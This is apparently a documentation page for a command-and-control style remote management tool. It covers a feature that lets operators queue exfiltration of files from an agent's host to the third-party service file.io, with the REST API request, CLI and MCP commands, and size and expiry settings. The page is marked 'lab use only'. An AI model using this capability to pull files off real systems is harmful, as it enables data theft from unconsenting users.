# file.io upload

Operators can queue exfil of a **remote file on the agent** to [file.io](https://www.file.io/). The agent uploads directly to file.io; the RMM server stores only the returned link in the session transcript (no copy under `RMM_logs/`).

## Flow

1. Operator queues via REST, CLI, MCP, or web UI.
2. Server enqueues `__FILEIO__ <remote_path> [expires]` for the next beacon.
3. Agent reads the file, POSTs multipart form data to `https://file.io/`.
4. Agent POSTs JSON to `/result?type=fileio_upload`.
5. Event transcript shows `remote_path → https://file.io/…`.

## Operator API

```http
POST /api/v1/sessions/{id}/fileio
Authorization: Bearer <RMM_API_TOKEN>
Content-Type: application/json

{"remote_path": "C:\\Users\\x\\doc.pdf", "expires": "14d"}
```

Response:

```json
{
  "ok": true,
  "session_id": "…",
  "queued": "__FILEIO__ C:\\Users\\x\\doc.pdf 14d",
  "max_bytes": 104857600,
  "expires": "14d"
}
```

## CLI and MCP

- `rmm_cli.py fileio <remote_path> [--expires 1w]`
- Interactive: `fileio C:\path\file.zip 14d`
- MCP tool: `queue_fileio(session_ref, remote_path, expires=None)`

## Limits and configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `RMM_FILEIO_MAX_BYTES` (server + agent env) | 100 MB | Max file size before upload |
| `RMM_FILEIO_DEFAULT_EXPIRES` (server env) | `14d` | Default expiry when omitted |

Allowed expiry tokens: `1d`, `2d`, `3d`, `7d`, `14d`, `1w`, `2w`, `1m`, `2m`, `3m`, `6m`, `1y`, or `\d+[dwmh]`.

## Security

- Files leave the agent and are stored on a **third-party** service (lab use only).
- file.io links are ephemeral per their policy (typically one download).
- Agent uses the same HTTP proxy settings as beacon traffic when `$httpProxy` is set.

## Related

- Server: `queue_agent_fileio`, `handle_result` (`fileio_upload`)
- Agent: `Invoke-RmmFileIoUpload`, `Parse-RmmFileIoCommand`
- Web UI: **Upload to file.io** in the tools panel
